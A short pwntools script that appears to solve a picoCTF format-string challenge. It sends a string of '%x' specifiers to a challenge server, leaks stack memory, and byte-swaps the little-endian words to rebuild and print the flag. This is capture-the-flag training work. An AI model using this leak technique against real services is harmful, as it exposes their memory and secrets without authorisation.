from pwn import *

payload = b'%x' * (127 // 2)

#r = process('./vuln3')
port = int(input('port='))
r = remote('saturn.picoctf.net', port)
r.sendline(payload)
r.recvline()
line = r.recvall()
line_s = line.decode('ascii')
print(line)
for i in range(len(line)-1):
	if str(line_s[i]) + str(line_s[i+1]) == '7b':
		section = line_s[i:-1]
		if len(section) % 2 == 1:
			section += '0'
		sb = bytes.fromhex(section)
		print(b'pico' + sb)
		if input('ok? ') != 'n':
			# Decode Little Endian
			# Start of flag is at $ebp-0x48 and ebp is *probably* aligned
			final = b''
			for j in range(0, len(section), 4):
				if j+3<len(sb): final += bytes([sb[j+3]])
				if j+2<len(sb): final += bytes([sb[j+2]])
				if j+1<len(sb): final += bytes([sb[j+1]])
				if j<len(sb): final += bytes([sb[j]])
			print('pico' + final[:final.find(b'}')+1].decode('ascii'))
			break


	
	
